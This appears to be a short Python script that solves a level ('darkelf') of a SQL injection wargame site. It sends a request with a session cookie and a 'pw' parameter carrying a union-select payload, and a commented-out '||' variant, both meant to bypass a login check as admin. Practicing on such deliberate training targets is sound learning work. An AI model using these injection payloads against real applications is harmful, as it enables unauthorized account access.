import requests

url = "http://los.rubiya.kr/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"

headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}

params = {
"pw":"' union select 'admin"
#"pw":"' || id='admin"
}

res = requests.get(url, params=params, headers=headers)
print res.content





